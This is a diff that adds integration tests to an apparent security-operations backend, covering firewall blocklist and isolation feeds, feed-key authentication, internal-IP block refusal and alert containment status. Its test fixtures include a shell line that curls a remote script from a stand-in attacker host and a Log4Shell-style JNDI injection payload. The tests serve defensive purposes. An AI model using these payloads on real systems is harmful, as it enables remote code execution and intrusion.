@@ -164,13 +164,17 @@ const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline t
     const st = (await call('GET', `/api/alerts/${alertId}`)).json;
     ok(st.alert.status !== 'CONTAINED', 'alert is not marked contained before enforcement');
     ok((await call('GET', '/api/feeds/blocklist.txt', { as: null })).status === 401, 'feed needs a key');
+    ok((await call('POST', `/api/ingest/alerts?key=${ingestKey}`, { as: null, body: [] })).status === 401, 'query-param key is not accepted on write endpoints');
     const basic = Buffer.from(`fw:${feedKey}`).toString('base64');
     r = await call('GET', '/api/feeds/blocklist.txt', { as: null, headers: { Authorization: `Basic ${basic}` } });
     ok(r.status === 200 && r.text.split('\n').includes('185.220.101.45'), 'firewall pulls blocklist with basic auth');
     rules = (await call('GET', '/api/rules')).json;
     ok(rules.find((x) => x.rule_id === block.rule_id).enforcement.status === 'ENFORCED', 'pull marks the rule ENFORCED');
+    r = await call('GET', `/api/feeds/blocklist.txt?key=${encodeURIComponent(feedKey)}`, { as: null });
+    ok(r.status === 200 && r.text.split('\n').includes('185.220.101.45'), 'URL-only firewall pulls blocklist with ?key=');
     r = await call('POST', '/api/verify', { body: { target_ip: '185.220.101.45' } });
-    ok(r.json.contained === true && r.json.status === 'ENFORCED', 'verify reports enforcement read-back');    r = await call('GET', '/api/overview');
+    ok(r.json.contained === true && r.json.status === 'ENFORCED', 'verify reports enforcement read-back');
+    r = await call('GET', '/api/overview');
     const steps = Object.fromEntries(r.json.setup.steps.map((s) => [s.id, s]));
     ok(r.json.setup.total === 5 && steps.enforce.done === true && steps.assets.done === true && steps.notify.done === false, 'setup checklist reflects what is actually connected');
 
@@ -222,6 +226,7 @@ const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline t
     ok(r.json.alert.resolved_at && r.json.notes.some((n) => /bulk/.test(n.body)), 'bulk close stamps resolved_at and the timeline');
 
     // ---- Time-boxed containment ------------------------------------------------------
+    ok((await call('POST', '/api/rules', { body: { target_ip: '192.168.1.1', action: 'BLOCK', reason: 'accidental lan block' } })).status === 400, 'manual internal IP block refused');
     r = await call('POST', '/api/rules', { body: { target_ip: '198.51.100.77', action: 'BLOCK', reason: 'credential stuffing', ttl_hours: 24 } });
     ok(r.status === 201 && r.json.expires_at, 'block with 24h expiry');
     ok(received.some((m) => JSON.parse(m.body).event === 'containment'), 'containment pushed to the channel');
@@ -610,6 +615,20 @@ const offlineNvd = { async fetchCve() { throw new Error('fetch failed (offline t
     ok((await call('GET', '/api/alerts?limit=1')).status === 200, 'core API unaffected by missing migration');
     ok((await call('GET', '/api/health')).json.pending_migration === '20261018000000_cases_approvals_hunts.sql', 'health reports the pending migration');
     store.pending = null;
+    // Confirmed compromise advances to CONTAINED once both blocklist.txt and isolate.txt are pulled, and internal IPs never leak into blocklist.txt.
+    await store.rules.insert({ rule_id: 'FW-LEGACY-LAN', target_ip: '192.168.1.1', action: 'BLOCK', reason: 'legacy mistake', enacted_by: 'test', is_active: true, enforcement: { mode: 'feed', status: 'PENDING' } });
+    await call('POST', '/api/ingest/logs?host_ip=10.0.4.99&log_type=edr_process', { as: null, raw: 'uid=33(www-data) /bin/sh -c curl 198.51.100.88/p.sh\n', headers: { Authorization: `Bearer ${ingestKey}`, 'Content-Type': 'text/plain' } });
+    r = await call('POST', '/api/alerts', { body: { signature: 'Web shell command execution', source_ip: '198.51.100.88', dest_ip: '10.0.4.99', dest_port: 8080, severity: 'CRITICAL', raw_payload: 'GET /?cmd=${jndi:ldap://198.51.100.88:1389/a} HTTP/1.1' } });
+    const compAlertId = r.json.alert_id;
+    await call('POST', '/api/investigations/stream', { body: { alert_id: compAlertId } });
+    ok((await call('GET', `/api/alerts/${compAlertId}`)).json.alert.status === 'CONFIRMED', 'confirmed compromise waits for firewall feed pull');
+    r = await call('GET', `/api/feeds/blocklist.txt?key=${encodeURIComponent(feedKey)}`, { as: null });
+    ok(r.text.split('\n').includes('198.51.100.88') && !r.text.includes('192.168.1.1'), 'blocklist includes external attacker and strips internal LAN IPs');
+    ok((await call('GET', `/api/alerts/${compAlertId}`)).json.alert.status === 'CONFIRMED', 'alert stays CONFIRMED while host isolation is still pending');
+    r = await call('GET', `/api/feeds/isolate.txt?key=${encodeURIComponent(feedKey)}`, { as: null });
+    ok(r.status === 200 && r.text.split('\n').includes('10.0.4.99'), 'isolate feed returns compromised internal host');
+    ok((await call('GET', `/api/alerts/${compAlertId}`)).json.alert.status === 'CONTAINED', 'alert moves to CONTAINED once all investigation rules are pulled');
+
     // Password change revokes the old cookie.
     const oldCookie = jar.admin;
     r = await call('POST', '/api/auth/password', { body: { current_password: 'Str0ngPassword', new_password: 'Newer1Password' } });
